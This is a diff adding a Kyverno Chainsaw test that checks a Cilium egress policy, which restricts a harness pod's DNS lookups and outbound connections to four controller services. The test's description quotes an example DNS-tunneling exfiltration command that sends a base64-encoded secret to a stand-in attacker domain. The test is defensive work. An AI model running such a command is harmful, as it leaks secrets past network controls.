@@ -1,0 +1,108 @@
+apiVersion: chainsaw.kyverno.io/v1alpha1
+kind: Test
+metadata:
+  name: harness-egress-dns-allowlist
+spec:
+  description: |
+    The chart-shipped CiliumNetworkPolicy `harness-egress` is the SOLE
+    harness egress policy. It owns both L4 destinations (kube-dns,
+    hangar-ctrl, airlock-ctrl, mainframe-ctrl, relay-ctrl) AND the L7
+    DNS allowlist on kube-dns.
+    Default-deny otherwise.
+
+    Why one CNP and not a K8s NetworkPolicy alongside: Cilium's
+    documented L4-shadows-L7 merge semantics mean a sibling K8s NP that
+    allows kube-dns:53 with no L7 nullifies the CNP's L7 allowlist.
+    Verified empirically on Cilium 1.19.3.
+
+    Without the L7 allowlist, the harness can be steered to exfiltrate via DNS
+    tunneling (`dig <base64-secret>.evil.com @kube-dns`), since L4-only
+    permits the query and the resolver chain forwards it to the
+    attacker's nameserver.
+
+    This bucket asserts the CNP's structural shape:
+      - name + namespace
+      - endpointSelector labels
+      - kube-dns egress with all four matchName entries
+      - hangar-ctrl:9090 egress
+      - airlock-ctrl:9090 egress
+      - mainframe-ctrl:9090 egress
+      - relay-ctrl:9090 egress
+    Catches deletion of any individual rule. The live DNS-probe is out of
+    scope per the audit memo — it would test Cilium, not sycophant.
+
+    Self-applies the tenant chart's harness-netpol template into a
+    chainsaw-managed namespace so this bucket runs standalone (not
+    coupled to scripts/e2e.sh having installed the tenant chart).
+  bindings:
+    - name: tenant_ns
+      value: tenant-chainsaw-egress
+  steps:
+    - name: create-tenant-ns-and-apply-netpol
+      try:
+        - script:
+            env:
+              - name: TENANT_NS
+                value: ($tenant_ns)
+            content: |
+              set -e
+              kubectl create namespace "$TENANT_NS" --as=system:serviceaccount:sycophant-system:tenant-deployer
+              REPO_ROOT=$(git rev-parse --show-toplevel)
+              helm template "$TENANT_NS" "$REPO_ROOT/charts/sycophant-tenant" \
+                --show-only templates/harness-netpol.yaml \
+                -n "$TENANT_NS" \
+                | kubectl apply -f -
+    - name: assert-harness-egress-cnp-shape
+      try:
+        - assert:
+            resource:
+              apiVersion: cilium.io/v2
+              kind: CiliumNetworkPolicy
+              metadata:
+                name: harness-egress
+                namespace: ($tenant_ns)
+              spec:
+                endpointSelector:
+                  matchLabels:
+                    app.kubernetes.io/component: harness
+                    app.kubernetes.io/part-of: sycophant
+                (egress[?toEndpoints[?matchLabels."k8s-app"=='kube-dns']]):
+                  - toPorts:
+                      - ports:
+                          - port: "53"
+                            protocol: UDP
+                          - port: "53"
+                            protocol: TCP
+                        rules:
+                          dns:
+                            (contains(@[*].matchName, join('.', ['hangar-ctrl', $tenant_ns, 'svc.cluster.local']))): true
+                            (contains(@[*].matchName, join('.', ['airlock-ctrl', $tenant_ns, 'svc.cluster.local']))): true
+                            (contains(@[*].matchName, join('.', ['mainframe-ctrl', $tenant_ns, 'svc.cluster.local']))): true
+                            (contains(@[*].matchName, join('.', ['relay-ctrl', $tenant_ns, 'svc.cluster.local']))): true
+                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='hangar-ctrl']]):
+                  - toPorts:
+                      - ports:
+                          - port: "9090"
+                            protocol: TCP
+                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='airlock-ctrl']]):
+                  - toPorts:
+                      - ports:
+                          - port: "9090"
+                            protocol: TCP
+                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='mainframe-ctrl']]):
+                  - toPorts:
+                      - ports:
+                          - port: "9090"
+                            protocol: TCP
+                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='relay-ctrl']]):
+                  - toPorts:
+                      - ports:
+                          - port: "9090"
+                            protocol: TCP
+      finally:
+        - script:
+            env:
+              - name: TENANT_NS
+                value: ($tenant_ns)
+            content: |
+              kubectl delete namespace "$TENANT_NS" --ignore-not-found --wait=false
